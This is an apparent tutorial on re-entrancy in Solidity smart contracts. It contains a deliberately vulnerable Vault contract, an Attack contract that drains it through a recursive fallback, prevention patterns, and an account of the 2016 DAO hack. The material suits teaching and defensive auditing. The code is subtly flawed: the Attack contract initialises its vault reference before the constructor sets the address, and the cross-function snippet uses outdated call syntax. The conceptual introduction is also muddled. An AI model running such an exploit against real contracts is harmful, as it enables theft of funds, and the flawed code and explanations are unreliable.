# Re-Entrancy

## Introduction
Re-entrancy occurs in single-threaded computing environments when the execution stack jumps or calls subroutines before returning to the initial execution. 

Let’s break down this statement to understand it better. A “single-threaded computing environment” is a computer program that can process each computation from beginning to completion before the next computation can begin to be processed. 

Reentrancy is when the code to be executed forwards the execution stack, i.e., the flow of execution of the code to a subroute, where the subroute performs its operation and returns the flow of execution back to the main code, thus the name re-entrancy.

In layman’s terms, there is only one way by which the execution of a code can be done. 

Re-entrancy occurs in a smart contract when control of the flow in a contract is passed from trusted code to untrusted external code. If a malicious actor gets hold of the flow of execution in the middle of computation, which is a transaction when we are talking about smart contracts, they can manipulate the transaction to their benefit. More about this later in the lesson.

By design, the EVM and most other blockchain computers perform single-thread computation. Single-thread execution ensures smart contracts’ atomicity and eliminates some race conditions. But on the other hand, because of it, contracts are vulnerable to poor execution orders, which may result in re-entrancy.

## Reentrancy in Solidity Smart Contracts
Let’s create a reentrancy scenario to better understand it. Below is a vault contract that remembers the balance of each address that deposits ETH to it and lets them withdraw it when they want to. 

The **deposit ()** function lets an account send ETH when calling the function. It saves the amount sent by the sender in a mapping called **balances**. 

The **withdraw()** function checks the amount against the address of the caller in the **balances** mapping, sends an equivalent amount of ETH from the contract to the caller, and then updates the balance of the caller to zero.

```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.6;
    
    contract Vault {
        mapping(address => uint) public balances;
        
        function deposit() public payable {
            balances[msg.sender] += msg.value;
        }
        
        function withdraw() public {
            uint bal = balances[msg.sender];
            require(bal > 0);
        
            (bool sent, ) = msg.sender.call{value: bal}("");
            require(sent, "Failed to send Ether");
        
            balances[msg.sender] = 0;
        }
    }
```

Let’s try and write a contract that can empty up all the ETHs deposited in this contract using the knowledge that smart contracts are single-threaded computers, and once the flow of code is passed to an external code, the external code can manipulate the flow to its benefit.

So, how do we do it? Do you see the `msg.sender.call` method in the contract? It is a common way of sending ETH to other contracts. This method forwards the flow of the function to the `fallback()` function of the called contract. Let’s write a contract that tries to steal the funds of this contract when it gets the flow of execution to its `fallback()` function. 

```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.6;
    
    interface IVault{
        function deposit() external payable;
        function withdraw() external;
    }
    
    contract Attack {
        address vaultAddress;
        constructor(address _vaultAddress){
            vaultAddress =  _vaultAddress;
        }
        IVault vault = IVault(vaultAddress);
        function attack() external payable {
            require(msg.value >= 1 ether);
            vault.deposit{value: 1 ether}();
            vault.withdraw();
        }
            fallback() external payable {
            if (address(vault).balance >= 1 ether) {
                vault.withdraw();
            }
        }
    }
```

To attack the vault contract, you have to send 1 ether when you call the `attack()` function.

In the `fallback()` function, we check the balance of the vault contract, and if the balance is not zero, we call the `withdraw()` function again.

## Prevention

Now that we’ve seen how a re-entrancy attack works, let’s take a look at some of the techniques that can be used to avoid re-entrancy.

### Checks-Effects-Interactions Pattern

A quick and efficient way to stop re-entrancy is to use the Checks-Effects-Interactions pattern. In this method, you write the code inside your function in such a manner that:

- First, all the conditions for the caller to call that function are checked. 
- Second, all the state modifications required in the function are done.
- Third, external calls to interact with the other contract are made.

Let’s rewrite the vault in the previous section according to the **Checks-Effects-Interactions** pattern to better understand the pattern.

```solidity
    function withdrawWithCEI() public {
        uint bal = balances[msg.sender];
        // Checks:
        require(bal > 0); 
        // Effects:
        balances[msg.sender] = 0;
        // Interaction:
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
    }
```

Because we are updating the caller’s balance before passing the flow of execution to the external attacker contract, if the external contract tries to re-enter, the execution gets stopped by the require statement at the beginning. 

### Openzeppelin’s Reentrancy Guard
Openzeppelin’s Reentrancy Guard1 uses a gas optimized mutex (mutually exclusive flag) pattern, which is a common method for limiting reentrancy. In this method, a lock is placed around the function call that is susceptible to reentrancy using a modifier called **nonReentrant**. When the vulnerable function execution starts, the lock is open, thus letting the execution happen, but it is immediately locked as the execution of the function starts and so long as the execution of the function goes on. Once the complete execution is finished, the lock is again opened.

Because we are turning the flag to locked as soon as we get the execution started, if a malicious external contract tries to re-enter the function in the middle of execution, the require statement that checks if the flag is unlocked will terminate the execution. Thanks to Openzeppelin’s gas-optimized and battle-tested contract, this is a very practical way to implement a reentrancy guard. Simply import the Reentrancy Guard contract and apply the nonReentrant modifier to all the vulnerable functions is all that is required.

Please now try to imitate the attack in the previous section by putting the aforementioned strategies into practice to see them in action. 

## Types of Re-entrancy Attacks

- **Single Function Attack:** This is an attack where the malicious contract re-enters the same function from which it had made the external call to itself. The vault contract in the previous section is an example of such an attack. 
- **Cross-function Reentrancy:** This is an attack where the function from which the malicious external call is made is different from the function to which the re-entry is made by the malicious contract, but both the functions use require statements that check the same state variable. Below is an example of a cross function re-entrancy prone code. 

```solidity
    mapping (address => uint) private userBalances;
    function transfer(address to, uint amount) {
        if (userBalances[msg.sender] >= amount) {
            userBalances[to] += amount;
            userBalances[msg.sender] -= amount;
        }
    }

    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        (bool success, ) = msg.sender.call.value(amountToWithdraw)("");
        // At this point, the caller's code is executed, and can call transfer()
        require(success);
        userBalances[msg.sender] = 0;
    }
```

## Real World Example

### DAO Hack
Ethereum’s DAO (Decentralized Autonomous Organisation) was hacked for an equivalent of $60 million in Ether in 2016. Ethereum’s DAO was a project designed to act as an investor-directed venture capital firm where members in the network could vote on initiatives to invest in.

The smart contract in which the funds were locked was vulnerable to a reentrancy attack due to a recursive call bug in the code. The code shown as the example of cross function re-entrancy in the previous section is a simplified version of the DAO’s vulnerable code. The hacker was able to attack the contract and drain 3.6 million ethers.